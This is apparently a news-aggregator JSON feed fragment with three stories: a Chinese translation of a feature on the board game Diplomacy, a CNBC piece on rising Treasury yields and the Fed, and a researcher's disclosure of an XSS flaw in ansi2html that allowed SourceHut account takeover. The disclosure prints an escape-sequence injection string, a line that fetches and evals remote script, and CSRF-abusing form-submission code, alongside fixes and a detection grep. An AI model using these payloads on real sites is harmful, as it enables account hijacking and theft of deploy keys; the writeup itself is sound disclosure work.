+        "fullTranslation": "在《战国风云》（Risk）之前，在《龙与地下城》（Dungeons & Dragons）之前，在《万智牌》（Magic: The Gathering）之前，就已经有了《强权外交》（Diplomacy）。一名作家参加了一场国际赛事，去体验这款重新定义了何为极客（以及何为人）的征服世界桌游。\n那是在1909年的夏天。我位于西班牙南海岸。我记得很清楚，因为那个季节就要结束了。我觉得和平近在咫尺。之前曾有一轮旨在结束战争的表决，英国人让我投赞成票。但表决需要全票通过才能生效，最终失败了。俄罗斯人、意大利人，他们都认为英国人投了反对票，我被骗了。我凭什么相信他们？多年来我和英国人一直通力合作对抗所有人。他们当然想挑拨我们之间的关系。现在时间在一分一秒流逝。我极度渴望和平。我吃不准自己的国家能否再撑个两三年，无论有没有英国的支援。在秋季之前不会再有下一轮表决了。\n“今年秋天你会支援我在西班牙的部队吗？”我问。\n“不行。门儿都没有，”英国人回答道。一阵恐惧感涌上心头。他打算背叛我。\n“你怎么能这么对我？在我为你做了这一切之后。”\n“大概我就是这么个心狠手辣的混账吧。”\n说完他就转身走开了，留下我张口结舌地站在走廊里。他回到了棋盘旁的其他玩家中间，所有人都盯着我，眼里满是怒火。我们早就警告过你了。\n在过去的八个小时里，我一直身处北卡罗来纳州查珀尔希尔一栋宿舍楼的地下室，与其他六个男人一起玩一款名为《强权外交》的桌游。我们每个人都在与另外80个人角逐，争取在这个周末的“南方大会”（Dixiecon）结束时加冕为《强权外交》的世界冠军。其中一位叫布莱恩·埃克顿（Brian Ecton），是来自马里兰州乔治王子县的高中数学老师，留着像喜剧演员卡特·威廉姆斯（Katt Williams）一样的发型，嘴巴也一样不饶人。他一开局就找上了我，看出我是个新手并主动提出结盟。他详尽解释了结盟的运作方式，并表示我们最后可以共享平局。我没有任何理由不同意。\n接下来的几个小时里，其他每位玩家轮番把我拉到一旁，向我解释布莱恩是在如何利用我、他将如何背叛我，以及我应该如何先发制人背叛他、与他们联手对付布莱恩。我把他们的话全都当成了耳旁风。毕竟，谁能保证他们不会同样背叛我呢？在这局游戏里我的水平本就处于下风。我心想，挑一个玩家并无论发生什么都坚定站在他这一边会更稳妥。但我现在却站在了这里，濒临出局，而其他玩家也怒不可遏。在他们看来，如果我几个小时前听了劝，本可以避免这种局面。\n“你难道没意识到我们有些人跋山涉水赶来就是为了赢下这场比赛吗？”一位来自法国的玩家厌恶地对我说，“就因为你不肯背刺（stab）这家伙，你不仅自己要完蛋，还要拉着我们大家一起陪葬。”\n“你写这篇文章是有稿费拿的吧？”一位苏格兰玩家问我，“而我为了来这里被你坑惨，可是扣了整整三天的工资。”\n我至今仍不知道自己当时究竟应该相信谁，如果真有值得信任的人的话。我只知道自己当时感到愚蠢、压力山大、受尽屈辱且伤心透顶。我和其中几个人爆发了好几次大吵。有些争吵甚至上升到了人身攻击。而我对布莱恩·埃克顿的忠诚，以及对其他玩家的义愤填膺，最终换来的却是一无所有。我身心俱疲，情感上遭受了极大摧残。我恨布莱恩，其他玩家都恨我，而我最恨的是我自己。我不得不死死抿住嘴唇，才能强忍住夺眶而出的眼泪。\n《卡坦岛》（Settlers of Catan），见鬼去吧，你根本比不上这个。\n如果你听说过《强权外交》，多半是因为它被称为“摧毁友谊的游戏”。同样可能的是，你从未完整玩完过一局。这是因为《强权外交》需要七名玩家，并且需要七到八个小时才能打完。而在它问世的前30年里大多数人采用的通信邮寄走子方式，一局游戏甚至可能耗时一年以上才能结束。尽管如此，《强权外交》依然是历史上最受欢迎的策略桌游之一。自哈佛毕业生艾伦·B·卡尔哈默（Allan B. Calhamer）于1954年发明该游戏以来，《强权外交》的销量已超过30万套，并与《强手棋》（Monopoly）、《妙探寻凶》（Clue）和《拼字游戏》（Scrabble）一同入选了《游戏》（Games）杂志的名人堂。\n这款游戏的规则极其简单。游戏棋盘是一张1914年的欧洲地图，划分为19个海区和56个陆区，其中34个区域包含所谓的“补给中心”。每个玩家扮演一个主要列强（奥匈帝国、土耳其、意大利、英国、法国、俄罗斯、德国），在棋盘上拥有三枚棋子（俄罗斯为四枚），这些棋子所在的区域被称为“本土补给中心”。每枚棋子每次只能移动一格，且每枚棋子的战斗力均等。当两枚棋子试图移动到同一个区域时，双方均无法移动。如果两枚棋子移动到同一个区域，但其中一枚获得了第三枚棋子的“支援”，获得支援的棋子将赢得对峙并占领该区域。游戏的目标是控制18个补给中心，但这种情况极少发生。更普遍的情况是两名或多名玩家商定以平局结束游戏。除了一些其他特殊情况外，规则基本就只有这些。\n有两点让《强权外交》显得如此独特且极具挑战性。第一点是，与大多数桌游不同，玩家并非轮流行动。每个人写下自己的行动指令并投入盒中。随后这些指令会被大声宣读，棋盘上的每一枚棋子同时移动。第二点是在每次行动前，玩家都会获得一定的时间进行交涉，可以集体讨论，也可以私下密谈。其结果就像是《战国风云》、扑克与《幸存者》（Survivor）的结合体——但既没有骰子，也没有扑克牌，更没有摄像机。这里不存在运气成分。游戏中唯一的变数就是每个玩家说服他人按自己意愿行事的能力。因此，核心的游戏机制就是谈判。这也是《强权外交》同时让人深深入迷又令人极度排斥的原因；因为一旦涉及谈判，为了达到目的可以不择手段。而大家通常也确实是不择手段。\n那是在1966年。一个名叫埃迪·比尔桑（Edi Birsan）的17岁少年正坐在布鲁克林的房间里，盯着一封邮寄来的信件出神。他把同一句话反复读了一遍又一遍：“我不反对三人平局，我不会再占领更多的补给中心了……”摆在他面前桌上的是一张《强权外交》棋盘，局势大约进行到了中盘。\n两年前，埃迪的母亲离家出走了。她与埃迪继父的婚姻多年来一直处于破裂边缘。他们吵架、分手、复合，周而复始。1964年的某一天，她在银行单据上伪造了埃迪的签名，取走了5000美元——那是埃迪从9岁起就攒下的全部积蓄——随后远走高飞去了加利福尼亚。她在蒂华纳经停办理了墨西哥离婚手续，一切就这么结束了。\n\n据埃迪（Edi）自己承认，他性格内向且压抑。在母亲不辞而别一年后，埃迪开始接受心理治疗。他的心理治疗师发现，他需要宣泄内心压抑的攻击性，并学会重新信任他人。治疗师送了他一份礼物——一盒桌游。“我在杂志上读到过，这是肯尼迪最喜欢的游戏。他们曾在白宫里玩过它。”她告诉他，这款游戏能帮助他应对背叛。\n\n如今，他正身处一场已经精心玩了数月的对局中途。他和另外两名玩家本有望达成三方和局。他再次阅读了信中的那句话：“我不反对三方和局，我也不会再占领任何补给中心……”\n\n埃迪从抽屉里拿出剪刀和笔，开始对这封信进行精心伪造与篡改。完成后，他自豪地举起信，在心里读了一遍：“我反对三方和局，我还要再占领三个补给中心……”他把这封伪造的信件寄给了第三位玩家。然后，他静静等待。\n\n艾伦·卡尔哈默（Allan Calhamer）于1954年在哈佛大学读法学期间发明了这款游戏。他本打算将其卖给某家主流游戏公司，但都被拒绝了。1959年，他自费生产了500套，并全部卖给了纽约周边的玩具店。1961年，一家名为Games Research的小型游戏出版商接手了这款游戏。但由于要召集七个人花上一整天时间来玩一局游戏实在太困难，销量并不理想。看起来，《外交》（Diplomacy）这款游戏的寿命不会太长了。直到极客们拯救了它。\n\n1963年，约翰·博德曼（John Boardman）是多家业余科幻同人志的编辑。在那个《星际迷航》尚未问世的年代，科幻小说仍是一种高度小众的亚文化。自20世纪30年代以来，同人志一直是科幻迷交流和分享故事与创意的首要途径。约翰·博德曼也是《外交》游戏的爱好者，但苦于很难把玩家凑齐来开一局。但他有了一个主意：在他的一本科幻同人志上刊登广告，看看是否有人对通过邮政通信下棋感兴趣。收到的反响令人鼓舞。1963年5月，博德曼组织了第一场邮寄式《外交》游戏，并创办了第一本《外交》同人志《格劳斯塔克》（Graustark）。短短四年内，充斥着邮政对局的《外交》同人志就至少涌现了32种。不久后，Games Research开始通过在游戏包装中附上同人志编辑的姓名和地址，来推广这种邮寄式玩法。\n\n随着《外交》通过邮政对局在北美日益风靡，一些更硬核的玩家开始好奇如果面对面对局，彼此较量会是何种情形。最初在后院举行的顶尖玩家非正式随意聚会，最终演变成了在大学校园里举办的年度大会。他们将其命名为“DipCon”，它成为了决出全美《外交》冠军的终极权威赛事。\n\n1976年，该游戏的版权被阿瓦隆山（Avalon Hill）购得，后者是当时全球最大的策略桌游与战争游戏出版商之一。该公司前一年刚刚在巴尔的摩创办了一个名为“Origins”的游戏大会。他们邀请《外交》玩家社群在Origins II上举办DipCon，结果造就了北美有史以来规模最大的《外交》锦标赛，吸引了约230名玩家参赛。\n\n在阿瓦隆山的支持和推广下，《外交》找到了国际受众，并在欧洲尤其是英国迅速流行开来。然而，该游戏的核心社群依然是那些业余同人志的编辑和读者。通过新加入的国际玩家在这些同人志上发表的文章，有人提议在英国举办一场赛事。1988年，首届世界外交锦标赛（World DipCon）在英格兰伯明翰举行，此后每年轮流在不同国家举办。自1988年以来，世界外交锦标赛已在10个不同国家举行过。世界外交锦标赛的胜者被全球《外交》社群公认为官方世界冠军。\n\n北卡罗来纳州律师大卫·胡德（David Hood）开着一辆黄色凯迪拉克，身穿泡泡纱西装，现身2014年世界外交锦标赛开幕式。陪同他前来的还有头戴皇冠、身披绶带的选美皇后“北卡罗来纳夫人”。\n\n作为Dixiecon的组织者，胡德数十年来一直是《外交》爱好圈里的常客，曾两度斩获北美冠军。早在20世纪80年代在北卡罗来纳大学求学时，胡德就已经在运营Dixiecon了。\n\n前来参加2014年世界外交锦标赛的业余外交官群体呈现出高度的一致性。在87名参赛选手中，仅有两名女性、两名21岁以下的选手，以及四名非洲裔美国人，其中包括2005年Dixiecon冠军布赖恩·埃克顿（Brian Ecton）。这些玩家与你对任何国际桌游聚会的预期大致相符：书卷气、不修边幅，并且略带社交局促。当然，这些刻板印象也有例外。如果说这群极客有什么不是的话，那就是他们绝非软弱无能之辈。\n\n“任何类型的游戏都会伴随一定程度的社交局促。但在《外交》中，你能找到玩家群体中更善于社交的类型，”28岁的希沃恩·诺兰（Siobhan Nolen）说道，她是来自北加州的时髦历史系研究生，也是参加本届世界外交锦标赛的两名女性之一。她的一头红发扎成马尾，露出了后颈处拼字游戏（Scrabble）棋子图案的纹身。作为一名硬核桌游玩家的女儿，她从小就被父亲带去参加各种大会，对桌游极客文化的了解丝毫不逊于任何人。“这是一种领袖气质。它吸引着非常聪明的人，也吸引着外向的人。如果你内向且不愿意展现自己，你是无法玩好这款游戏的。它吸引着喜欢说话的人。如果你不爱说话，这局游戏对你来说很快就会结束。”\n\n诺兰在13岁时就迷上了《外交》。当时她父亲带她去参加一个名为Conquest的游戏大会。她作为一个无聊的青少年，和哥哥在会场里闲逛，对玩任何游戏都提不起兴趣。这时，她遇到了六个人坐在一张《外交》棋盘前，其中很多人年纪并不比她大多少。年纪最大的玩家是一位五十多岁的男子，他向她招手示意：“我们还差一个人。”诺兰看了看棋盘、棋子和玩家们。表面上看，这就像她父亲玩的那种又一个无聊的战争游戏。“我绝不可能玩那个，”她回答道。但《外交》与她玩过的任何游戏都不同。它不仅仅是讲究战术，不仅仅是在棋盘上推移棋子。事实上，它几乎谈不上是这些。它具有人性的元素。她发现在自己的第一局对局中，她就能击败年长且经验更丰富的玩家，仅仅是因为她擅长说服他们向自己施以援手。她被它深深迷住了。那位年长的玩家问她日后是否愿意再玩，并要了她的电子邮件地址。他的名字叫埃迪·伯森（Edi Birsan）。\n\n那一年是1999年。50岁的埃迪·比尔桑坐在电脑前，房间里唯一的光源就是显示器发出的幽光。他盯着屏幕上的那封电子邮件。 “我不接受你的条件……”\n\n在过去30年里，比尔桑在外交游戏圈逐渐成为传奇人物。20世纪70年代，他通过出版自己的邮寄对战杂志，帮助这项爱好发展壮大；后来，他又协助组织了许多规模较大的外交游戏大会（DipCon）。他创立了一个全国性组织，用来制定规则和指导方针；早在世界外交游戏大会（World DipCon）出现之前，他就曾前往其他国家参加欧洲外交游戏赛事。他甚至和这款游戏的发明者艾伦·B·卡尔哈默对弈过，并把对方打得落花流水。10\n\n有一点比尔桑深信不疑：面对面进行的游戏更好。他更喜欢自己跋涉前往参加的锦标赛和私人对局，而不是通过邮寄进行的游戏。互联网出现后，面对面的外交游戏规模已经被如今通过电子邮件进行游戏的人数远远甩在后面。情况如此严重，以至于有人组织了一场电子邮件对局，让顶尖的电子邮件玩家对阵顶尖的面对面玩家。比尔桑就是那些面对面玩家之一。而且，他对这场比赛的进展方式很不满意。\n\n我不接受你的条件……\n\n比尔桑拿起电话，拨打了411。他询问休斯敦的一个电话号码，把号码记下来，然后挂上听筒。他深吸一口气，接着拿起电话拨了出去。\n\n“我是埃迪·比尔桑。”\n\n“我想谈谈你发给我的那封电子邮件。”\n\n“你说‘不’是什么意思？”\n\n“我真不敢相信你居然给我打电话！你不能这么做！”\n\n“这种事我已经做了30年！”\n\n“我玩外交游戏已经三年多了，却一次也没接到过电话，甚至从没和其他玩家说过话。”\n\n“以后别再给我打电话。”\n\n有人第一次提议投票决定和棋时，已经过了凌晨1点。那是在我们宿舍二楼套房里。我的第一场迪克西康（Dixiecon）比赛大约晚上7点开始，六个小时过去，只有一名玩家被淘汰。在剩下的六个人中，有一位是名叫克里斯·马丁的前世界冠军；他执掌意大利，手里只剩一个单位——一支被困在奥地利某处的陆军。由于没有其他棋子为自己提供支援，马丁实际上已经被淘汰——除非他能找到盟友，让自己继续留在游戏中。\n\n马丁拥有舞蹈学博士学位，说话轻声细语、语速很快，魅力十足。其他外交游戏玩家称他为“新手低语者”，因为他特别喜欢和缺乏经验的玩家结盟，并让他们按自己的意愿行事。他对此乐此不疲。马丁已经站在死亡边缘，却说服了我、西沃恩·诺伦，以及一位名叫马克·斯特格曼的亚利桑那大学经济学教授，让我们帮他活下去。他的理由是什么？无论我们是否抱团，我们三人中没有谁在战术上足够优秀，能够抵挡另外两名玩家的联盟。\n\n他的说法有道理，尽管完全是为了自身利益。棋盘上的另外两名玩家是托比·哈里斯和安迪·巴托洛内。前者是英国顶尖玩家之一，剃光的头让他看起来有几分像杰森·斯坦森；他和马丁一样，都是赢得世界冠军的热门人选。后者则是个身材像马克卡车一样魁梧的男人，嗓门洪亮，嗜好酗酒和赌博——大家亲切地叫他“水牛”。托比和“水牛”对六方和棋毫无兴趣。他们的提议是：先干掉克里斯·马丁，再由五个人分掉胜果。这样每个人都能多拿些分！\n\n“他们不会那么做的。”马丁在外面的走廊里低声对我们说，“我一旦出局，他们接下来就会解决你们中的一个。也许是你们三个。现在我们可以合作，组成一道他们无法突破的僵局线，然后迫使他们接受和棋。”\n\n马丁的逻辑是成立的。僵局线是一种无法突破的阵形，会迫使游戏以和棋告终。打破它的唯一办法，就是说服参与其中的一名玩家背叛其他人。我们或许可以在没有马丁的情况下干掉他，同时保住僵局线，但我们三人都不确定自己是否具备足够的战术能力，能够避免犯错。有马丁加入我们的队伍，我们就确信自己不会搞砸。而且，正如马丁对我们撒的谎一样，淘汰他每人只能得到两分。11\n\n“这太荒唐了！”“水牛”吼道，“西沃恩，我们能不能到走廊里谈谈？”\n\n诺伦看着我们，然后说",
+        "contentStatus": "full",
+        "translationStatus": "full",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 50,
+        "translationParagraphs": 33,
+        "keyTakeaways": [
+          "来源叙事重点：将外交描述为一款以谈判、联盟、欺骗和背叛为核心的策略游戏，并通过作者在比赛中的失误、冲突和情绪压力，呈现其对玩家关系和“极客”身份的塑造。报道同时强调游戏从1954年发明、经邮件通信发展到线下赛事和国际社群的过程。文章采用戏剧化、个人化叙事，把游戏体验与信任、竞争、羞辱和自我认知联系起来。"
+        ],
+        "citations": [
+          {
+            "source": "Hacker News (科技前沿论坛)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T20:53:39.000Z",
+            "url": "https://grantland.com/features/diplomacy-the-board-game-of-the-alpha-nerds/"
+          }
+        ]
+      },
+      {
+        "id": "story-n-warsh-and-the-fed-html-219202d923eb562d",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "Surging Treasury yields pose a brand new problem for Kevin Warsh and the Fed",
+        "source": "CNBC Economy (CNBC 宏观经济)",
+        "sourceSlug": "cnbc",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T21:40:19.000Z",
+        "pubTime": "2026-09-25 05:40",
+        "url": "https://www.cnbc.com/2026/09/24/surging-treasury-yields-are-posing-a-brand-new-problem-for-kevin-warsh-and-the-fed.html",
+        "imageUrl": null,
+        "fullContent": "The bond market is yelling at the Federal Reserve, but the messages are coming from different directions and pose a dilemma for policymakers as they seek to strike a balance that won't tank the economy.\n\nTreasury yields continued their upward march Thursday as investors sought to price in a variety of factors: inflation still hovering well above the Fed's 2% goal, another bump up in energy prices and the impact of a global hyperscaler financial arms race and accompanying debt issuance.\n\nIn the past, policymakers have been willing to look through inflation spurts from temporary shocks like high energy prices and tariffs. And the narrative not so long ago was that the artificial intelligence investing boom was a story that would last a year or two and ultimately prove disinflationary.\n\nBut now Fed officials are rethinking the impact of those factors and seeing the danger of more durable inflation.\n\nAt the same time, markets are grappling with a central bank that suddenly has no interest in telegraphing its next moves, leaving an uncertain calculus on who is calling the shots — policymakers or market players.\n\n\"The time of looking through the initial supply shock has come to an end,\" said Joseph Brusuelas, chief economist at RSM. \"The bias has to be towards restoring price stability, and they should take what's going on seriously.\"\n\nMarkets expect the central bank will indeed take a firmer hand on inflation.\n\nOver the past day or so, traders raised the odds of a rate hike in October, which would come only a month or so after last week's quarter percentage point increase. They also see a third increase either late this year or early in 2027, with additional hikes possible in subsequent months.\n\nThat's a big switch from a Fed that in June projected it might hike once this year and then be done before starting to cut in the next couple of years.\n\n\"My view coming out of the [September] meeting was that we're going to get three rate hikes,\" Brusuelas said. But modeling performed at his firm about the potential for higher yields, along with a prolonged cycle of AI investment, changed that view.\n\nThe modeling indicated that sharply higher long-term yields could slow growth and increase unemployment and still not get inflation back to 2%. RSM found that even a 5.5% 10-year yield — it was around 5.15% on Thursday — would lower growth to 1.5% and lift unemployment to 4.7% while core inflation remained stuck at 2.4%.\n\n\"The Fed is underestimating what's going to be necessary to restore price stability — that we're probably not talking two or three hikes. We're talking five or six,\" Brusuelas said.\n\nNot everyone on Wall Street agrees. Some strategists think the market is getting ahead of itself — that yields now essentially are pricing in stronger economic growth and are overly sensitive to the vagaries of oil prices amid the ongoing tensions in the Middle East.\n\n\"The rise in yields has not been due to expectations of a too-dovish Fed allowing inflation to persistently exceed target. Instead, the rise has been in real yields as investors priced-in the Fed setting higher policy rates,\" Citigroup economist Andrew Hollenhorst said in a note. \"It should not be surprising that this has led to both higher shorter-term and longer-term yields.\"\n\nIndeed, several key Fed officials, while endorsing near-term rate hikes, also are counseling patience.\n\nNew York Fed President John Williams, whose position puts him in the vice chair slot of the rate-setting Federal Open Market Committee, said Thursday that it's \"reasonable\" to expect another hike by the end of the year, but also noted that officials need to keep watching the data before getting on a pre-set \"forward guidance\" track of locking in rate hikes.\n\nSimilarly, Philadelphia Fed President Anna Paulson also indicated additional policy tightening is likely but characterized the potential moves as \"modest,\" hardly an indication that she thinks a string of hikes is likely.\n\nStill, the Fed faces a policy crossroads: Tighten too much and risk cutting off the expansion, or tighten too little and risk losing the market's faith that it is sufficiently tuned into inflation risks.\n\n\"Weak guidance guardrails risk putting both central banks in a position where they may have to decide between a sub-optimal hike and disappointing the market and risking hard-won credibility,\" Krishna Guha, head of economics and central bank strategy at Evercore ISI, said in a note. \"Lack of guidance also means whatever decision they take risks generating an outsized market response — either substantially further tightening or easing market rates.\"\n\nGuha is in the camp that the market's expectations are \"too aggressive\" while also seeing the Fed's dilemma.\n\n\"Delivering back-to-back hikes — particularly without forward guidance as to how to interpret them — would risk sending a very hawkish signal that would reprice the rates curve further and to an unpredictable extent,\" Guha said. \"But, skipping a hike priced odds-on in the market could also lead to a large repricing in the other dovish direction.\"\n\nThe conflict is critical now because Federal Reserve Chairman Kevin Warsh has emphasized letting markets help guide policy. That's a big reversal from central bank policy since the global financial crisis in 2008, when the Fed used its forward-guidance tool to signal to investors which way rates were headed.\n\n\"His framework appears significantly less rooted in economic measurement details and significantly more reflective of market narratives,\" UBS economist Jonathan Pingle wrote of Warsh. \"No Chairman of the Board of Governors of the Federal Reserve has emphasized considering the signals from financial markets as an input into monetary policy decisions as strongly as Chairman Warsh.\"\n\nWith a yield surge that has taken the 30-year bond to its highest level since 2004, market dynamics have swung Warsh from someone calling for cuts prior to taking the job in May, to a chair who seems to have forged a hawkish coalition on the FOMC.\n\nIn fact, Pingle speculated that Warsh, following last week's post-meeting news conference, \"left little doubt to us that his views more closely align\" with Cleveland Fed President Beth Hammack, arguably one of the most hawkish of this year's voting group, \"than anyone else on the FOMC.\"\n\nFor now, at least, markets are going with the interpretation that Warsh will let the Treasury market guide him toward progressively higher benchmark rates.\n\n\"There's a good reason why central bankers are beginning to be concerned about overheating in the investment section of the economy,\" said Brusuelas, the RSM economist. \"Mr. Market is signaling something to policymakers like Kevin Warsh that they ought to listen to.\"\n\nGot a confidential news tip? We want to hear from you.\n\nGet this delivered to your inbox, and more info about our products and services.\n\nData is a real-time snapshot *Data is delayed at least 15 minutes. Global Business and Financial News, Stock Quotes, and Market Data and Analysis.\n\nData also provided by",
+        "fullTranslation": "【官方正文已获取，中文全文翻译尚未完成；暂不展示外文正文。】",
+        "contentStatus": "full",
+        "translationStatus": "source-only",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 31,
+        "translationParagraphs": 0,
+        "keyTakeaways": [],
+        "citations": [
+          {
+            "source": "CNBC Economy (CNBC 宏观经济)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T21:40:19.000Z",
+            "url": "https://www.cnbc.com/2026/09/24/surging-treasury-yields-are-posing-a-brand-new-problem-for-kevin-warsh-and-the-fed.html"
+          }
+        ]
+      },
+      {
+        "id": "story-ts-srht-account-takeover-cb5ed105214e004b",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "SourceHut account takeover via build logs (XSS in ansi2html.py)",
+        "source": "Lobste.rs (极客思想社区)",
+        "sourceSlug": "lobsters",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T20:38:32.000Z",
+        "pubTime": "2026-09-25 04:38",
+        "url": "https://blog.arusekk.pl/posts/srht-account-takeover/",
+        "imageUrl": null,
+        "fullContent": "Welcome to my first big impact vulnerability writeup!\n\nI like good stories, so let me describe some background first. I recently had a ‘great’ idea (I know, I know, I should stop having these) to set up a sr.ht instance that would pay people for hosting their projects. You can find it shamelessly plugged in the timeline section, in case you want to try it or flame me for it on socials.\n\nAnyway, the story. The first step was to clone some minimal subset of the sr.ht repos, and start hacking on it.\n\nI tend to include the following statement in my vulnerability research submissions from this year. Make from it what you wish.\n\nNo NLP has been used in this research. The mistakes are all mine.\n\nSourceHut is structured in several microservices, the main ones being meta.sr.ht and probably git.sr.ht or hub.sr.ht (the flagship instance hosts it at just sr.ht). And of course builds.sr.ht, the CI.\n\nOne less known is mirror.sr.ht (slowly moving to mirror.srht.network), containing prebuilt packages for various microservices.\n\nI must say I like this approach, because it allows a very easy start on any machine matching the flagship instance distro version exactly.\n\nIf your favourite project currently recommends installation via curl|sudo bash or ‘just launch Claude in this folder’ (sic!), please consider making yourself aware of the not less valid option of distributing software to end users using actual software packages instead.1\n\nSo if you happen to use a different distro, or even a different version of Alpine, you are on your own a bit. So there is the sr.ht-apkbuilds repo, and you can ‘fork’ it to use your signing key, your Alpine version and your mirror. There is also sr.ht-pkgbuilds for Arch, but it’s effectively unmaintained at this point.2\n\nThis involves using builds.sr.ht to bootstrap the packages. I tried to look at the page source of the build log, because it kept scrolling not where I wanted, which annoyed me a bit.\n\nThat’s when I found this:\n\nI decided to take a closer look how it’s done, and maybe fix it. Look, I like SourceHut. I can see there is quite some wasted compute and bandwidth here. I want them to get rich so that others follow suit, and there is some unnecessary waste slowing that.3\n\nI took a look into the logic converting ANSI escape codes to HTML, and I filed an issue for it. There has been no activity in the repo for over a year at that point, so I decided to work on it, because I like receiving good patches myself, when I am not focused on a particular project. This quickly resulted in submitting a PR fixing this particular issue.\n\nGiven my Capture The Flag background, I started looking into ansi2html a bit more, in hunt for more bugs (especially that I’m about to host it myself!). Apart from parsing escape sequences for colors, it also allows for automatic links, and OSC 8 hyperlinks. Because the code is not so well-structured yet, I was able to craft a malicious input string after reading this great XSS cheatsheet (now forever in my bookmarks):\n\nThe former is worth some explanation. No idea why, but as you can check, it parses to the same DOM tree as:\n\nSo if you happen to be able to make ␛]8;;https://example.com/\"/...␇ appear in the job logs —4 which you can, either without even having an account, by sending a patch to a public mailing list with continuous integration turned on, or by controlling any remote resource that happens to be printed to the log — congratulations, you have just created a build job at https://builds.sr.ht/~someone-else/job/1234567 that executes your payload in every browser that views it. You can submit the job yourself, but this requires a paid account on the flagship instance. And there are no anonymous payments currently there.\n\nThe actual payload can be downloaded from an attacker’s website, like eval(await (await fetch('https://example.com')).text()) but here’s some speculation about what it could do.\n\nThe build log page already contains the CSRF token. You can read it with document.querySelector('[name=_csrf_token]').value for example, or just use the existing form (part of the ‘Resubmit build’ button), like document.querySelector('[name=manifest]').value=`something`;document.forms[0].submit(). Once you get an admin to view it, you can probably grant yourself admin rights. The worse impact is that you have access to all the deploy keys, and on builds.sr.ht, there are deploy keys for sr.ht itself (probably not the case with other instances).\n\nMaking this part of the payload is left as an exercise for the curious reader. I cannot stress this enough: remember to only test worms on your own infrastructure. And never on production. Even if it’s your production.\n\nBy restricting Content-Security-Policy. I’m no expert here, but removing ‘unsafe-inline’ would be a good first step (not useful advice in itself, because inline scripts are currently used even on the build log page itself, for scrolling).\n\nBy extra sanitization (SourceHut added it, but it’s overzealous - now there are no colors!).\n\nAnd by restructuring the code in ansi2html into some stateful transducer automaton thing.\n\nI immediately emailed ~sircmpwn/sr.ht-security@lists.sr.ht explaining the entire problem, complete with a fix that mitigated the worst part at least.\n\nDrew (can I call you Drew? I guess we are all brothers in Source) ended up patching builds.sr.ht to auto-sanitize the output from ansi2html instead. Also a good choice.\n\nThen I contacted upstream (maybe a bit too late? exact timeline below). Ansi2html is one of the projects featured in the famous and by now beaten to death comic strip by Randall Munroe.5 Placed under pycontribs org on GitHub, which ominously states:\n\nPyContribs main purpose is to assure that different Python-related projects remain maintained.\n\nI reached out to the two top people from last 5 or so years’ worth of contributor graph, emails from git history, in order not to make the issue public yet, although it was already made public by the SourceHut announcement.\n\nThe maintainer I believed to be the ‘main’ one (Sorin Sbarnea) has not replied to date (he might be having some kind of holiday), although the other one (Sebastian Pipping) has. And the message was a cryptic, unusual for me to receive, ‘mail me in two weeks’.\n\nSo I patiently waited two weeks, minding my another nascent business (let me try, okay?), and sent the email.\n\nIt turned out that Sebastian (can I call you Sebastian?) is a cool guy and he figured he needed me to help him because of something with ACLs on the repo. We ended up getting ansi2html up from the suspension it was in, updating some obsolete scripts, and releasing like 3 or 4 versions of ansi2html to PyPI together.\n\nI tried to be helpful, but had some things going on with my PhD-in-spe, so some latency crept in.\n\nLet’s start with the hot take that CVSS scoring is a fallacy: it should be separate for each product and not just one for one root cause code path.\n\nThe purpose of CVSS is after all to provide useful information to downstream users on whether to go patch it or not. Researchers have the incentive to make it as high as possible. And projects have the incentive to downplay it. They do want to fix it, but they want to avoid the paperwork involved, and the confidentiality dance of passing it all around (and I totally get it!).\n\nThe problem is, not all software is born equal, and this is especially the case with libraries like libcurl.\n\nCVSS 4.0 is at least a bit better than CVSS 3.x. It now makes a distinction on Vulnerable System and Subsequent System. In case of XSS vulnerabilities the typical approach is to say that the web service is Vulnerable, and the browser is Subsequent (which kind of makes sense, because the bug is in the service, but then it impacts the victim browser first in order to attack the web service itself again).\n\nThe vector I initially came up with has been altered by VulnCheck. Not sure why, but maybe it can be changed back? Or maybe not worth bothering. Let me know what you think. I also want to add this blog post to the CVE DB, but I might need to check how to do it.\n\nvulnerable system (builds.sr.ht / all of sr.ht)\n\nsubsequent system (victim browser)\n\nWhile the exact impact can and should be disputed by actual users (after all, SourceHut boasts working just fine without javascript), I would argue for high or critical, not just a mere medium, because if I were a blackhat, it would suffice that Drew visited an affected build log with JS turned on, and I could submit a build job in his name with access to SourceHut deploy keys. Not sure how I would turn that into money or get away with it though. Don’t do this, kids. No excitement justifies it.\n\nansi2html >=1.7.0, <1.9.4, builds.sr.ht >= 0.40.0, < 0.105.1\n\nCheck your raw build logs for ␛]8;;https://example.com/\"/...␇ or ␛]8;;javascript:...␇. In Bash, that would probably be something along grep $'\\33]8;[^\\7\\33]*\"' for the former.\n\nI’m not so proud of this timeline, but hey, at least everything is fixed now and there are no (?) records of people trying to use it. I will include the official Arch Linux repo and the sr.ht Alpine Linux repo, because both systems were recommended at one point.\n\nNote how even carefully auditing ansi2html would not save SourceHut, unless redone on every bump. builds.sr.ht remained vulnerable for (almost exactly) 4,5 years.\n\nGod for keeping the blackhat temptations away. Danonek123 for keeping me company. I love you.\n\nSee, vulnerability research does not need to be a circus, or security theatre, or a lawyered-up fight against bureaucracy. But then you might not end up better off.\n\nExcluding CTFs & invitations to minor conferences (and being allowed to do some VR as part of my internship back when at Antmicro, which I am still grateful for), I have made a metric 0.00€ (that’s $0.00 Fahrenheit) from my vulnerability research so far. If you want to support me (so that I have more time for VR), consider buying something. I like it better than donations (though they are fine too!). I’m also available for professional security consulting.\n\nOr at least provide some optional ultra-simple configure script that allows to just run make install/ninja install so that other people can package it easily. (By the way, I still can’t get it why people use AppImage instead of just a static binary.) ↩︎\n\nYou can still probably send your patches if you want to host your sr.ht on Arch! ↩︎\n\nHey Drew/Conrad/Simon/(sorry if I missed someone!), when you update ansi2html in sr.ht-apkbuilds, actually when you first restart builds.sr.ht after that, please measure the bandwidth impact on builds.sr.ht. I will make sure to link it here. ↩︎\n\nYes, that’s an em dash. I use Polish typography here, because I have no editor to answer to. Feel free to correct me, though. You can be my drive-by editor. ↩︎\n\nOops, sorry, wrong link. I’m talking about https://xkcd.com/2347/ of course. 